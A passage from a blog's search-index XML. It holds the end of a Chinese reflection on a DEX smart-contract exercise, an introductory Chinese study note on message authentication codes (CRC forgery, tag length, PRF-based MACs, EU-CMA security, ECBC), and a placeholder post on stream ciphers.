alt="1e848875d0f1927e415ac1a1f6c6b6f9"></p><h2 id="四、回顾"><a href="#四、回顾" class="headerlink" title="四、回顾"></a>四、回顾</h2><p>在这次实践过程中我多次出现了资源错配以及权限调整，同时对于DEX合约在Etherscan中无法写入的麻烦，在教导下才发现可以在Remix中调用调整，同时通过这次实践是我对区块链入门了解的生动实践，先完成，再完美，脚踏实地，毛躁的性格是做不好事情的反而会把事情拖得效率低下，产出一般；在以后的学习生活中也要积极向组内同学学习，认真高效才是最省力的聪明办法！</p>]]></content>
      
      
      <categories>
          
          <category> blockchain </category>
          
      </categories>
      
      
        <tags>
            
            <tag> smart contract </tag>
            
            <tag> Dapp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>密码学入门——消息认证码</title>
      <link href="/2025/11/12/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%85%A5%E9%97%A8%E2%80%94%E2%80%94%E6%B6%88%E6%81%AF%E8%AE%A4%E8%AF%81%E7%A0%81/"/>
      <url>/2025/11/12/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%85%A5%E9%97%A8%E2%80%94%E2%80%94%E6%B6%88%E6%81%AF%E8%AE%A4%E8%AF%81%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<h2 id="加密-完整性"><a href="#加密-完整性" class="headerlink" title="加密&amp;完整性"></a>加密&amp;完整性</h2><h3 id="Goal："><a href="#Goal：" class="headerlink" title="Goal："></a>Goal：</h3><p>在无需保密性的情况下提供完整性，基本机制如MAC（消息认证码）</p><h3 id="MACs"><a href="#MACs" class="headerlink" title="MACs:"></a>MACs:</h3><h5 id="基本组成：（发送方和接收方共享同一密钥k）"><a href="#基本组成：（发送方和接收方共享同一密钥k）" class="headerlink" title="基本组成：（发送方和接收方共享同一密钥k）"></a>基本组成：（发送方和接收方共享同一密钥k）</h5><p>$$<br>S(k,m)\to tag\space \space ;V(k,m,tag)\to ‘yes’&#x2F;‘no’<br>$$<br>$$<br>[其一致性要求为\forall k \in \mathcal{K},m\in \mathcal{M}:V(k,m,S(k,m))&#x3D;’yes’]<br>$$</p><p>若双方不共享同一密钥k，则难以达到完整性目的保障，比如CRC(循环冗余检验)：<br>$$<br>CRC(m)\to tag\space ，Verify(m,tag)\stackrel{?}{&#x3D;} yes<br>$$<br>但是攻击者可以直接拦截并伪造新的消息和验证码，从而破解消息。</p><h5 id="系统安全性（目标）："><a href="#系统安全性（目标）：" class="headerlink" title="系统安全性（目标）："></a>系统安全性（目标）：</h5><p>​        攻击者可以通过m向挑战者寻问其生成的tag，之后攻击者伪造一个新的(m,tag)（优势为挑战者最终输出’yes’的概率大于1&#x2F;2）若攻击者在已知消息-标签对后，无法为同一消息生成一个新的有效的标签，则此系统处于安全状态(<strong><a href="https://www.cnblogs.com/zywnnblog/p/16111384.html">SU-CMA</a></strong>:存在性不可伪造性)；</p><p><img src="https://i.postimg.cc/pTSYqVy6/e2516bb99cf380a599940d4f5f483118.png"></p><p>​       因此为了避免不安全因素（如只有5位mac码情况下，攻击者利用穷举攻击爆破），在构造MAC系统时标签数一般设置为64，96（<a href="https://www.ibm.com/docs/zh/ibm-mq/9.3.x?topic=overview-cryptographic-security-protocols-tls">TLS</a>），128等，以避免过短的标签会因为暴力破解而被爆破。</p><h5 id="缺点："><a href="#缺点：" class="headerlink" title="缺点："></a>缺点：</h5><p>​        仅验证文件内容完整性的认证机制（如MAC），虽然能有效防止数据被直接篡改，却无法防御一种更隐蔽的攻击：攻击者可以在不破坏任何认证标签的前提下，将系统中多个经过认证的合法数据进行交换。例如，病毒将两个未被篡改且MAC校验通过的文件互相调换位置，导致系统在加载错误内容时仍无法察觉，从而破坏其正常逻辑。常见的加固方法（如将文件名纳入认证范围）能缓解此问题，但若攻击发生在更高的逻辑层面（如交换经过认证的数据库记录或通信指令），此类基于单个实体的认证机制依然会失效。</p><h3 id="基于PRF-伪随机函数-的MAC构造"><a href="#基于PRF-伪随机函数-的MAC构造" class="headerlink" title="基于PRF(伪随机函数)的MAC构造:"></a>基于PRF(伪随机函数)的MAC构造:</h3><p>$$<br>设定一个PRF(F:k*m \to t)和一个MAC（I_{F}&#x3D;(S,V)）:\<br>其中S(k,m):&#x3D;F(k,m),\space V(k,m,t)\to yes(t&#x3D;F(k,m))&#x2F;no<br>$$</p><p>然而，若对于无论何值都只输出10bit的Tag的随机函数并不安全，因为其仍可有1&#x2F;1024的概率（不可忽略）来穷举爆破，因此对于其安全性的定义如下：<br>$$<br>(EU-CMA)假设对于一个随机函数f:X\to Y,攻击者向挑战者发送m_1,m_2,…,m_q（m\in X），\挑战者向攻击者发送回各自对应的tag，如t_1,t_2,…（t\in Y），之后攻击者发送回一个(m,t*)对，\若t\in Y，且m\notin X，则攻击者获胜，此时的获胜概率最多只有\Pr[A_{win}]&#x3D;\frac{1}{|Y|}\因此我们可以推断出基于PRF的MAC构造中敌手A的优势为Adv_{MAC}[A,I_F]\le Adv_{PRF}[B,F]+\frac{1}{|Y|}\当tag空间足够大时，其(对应的\frac{1}{|Y|})优势可被忽略。<br>$$<br>在一些实际应用中，我们发现AES就是一种16字节输入的MAC（以小消息PRF作为输入），若要构造消息空间大规模GB级别的，有HMAC（如SSL,SSH）和CBC-MAC(常用于银行业，如自动清算系统ACH,用于保证在银行间传输支票等信息的完整性)接受小输入PRF生成大输入PRF。（在实际应用中，我们可以在生成后通过截断，在保证可验证性的基础上减少tag的大小）</p><h3 id="CBC-MAC"><a href="#CBC-MAC" class="headerlink" title="CBC-MAC"></a>CBC-MAC</h3><h4 id="ECBC"><a href="#ECBC" class="headerlink" title="ECBC:"></a>ECBC:</h4><p>$$<br>设置一个PRP函数(F:K<em>X\to X)，定义新的PRF为（F_{ECBC}:K^2</em>X^{\le L}\to X）<br>$$</p><h5 id=""><a href="#" class="headerlink" title=""></a></h5>]]></content>
      
      
      <categories>
          
          <category> cryptography </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Message Integrity </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>密码学入门——流密码</title>
      <link href="/2025/11/11/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%85%A5%E9%97%A8%E2%80%94%E2%80%94%E6%B5%81%E5%AF%86%E7%A0%81/"/>
      <url>/2025/11/11/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%85%A5%E9%97%A8%E2%80%94%E2%80%94%E6%B5%81%E5%AF%86%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<p>Welcome!</p>]]></content>
      
      
      <categories>
          
          <category> cryptography </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Stream Ciphers </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
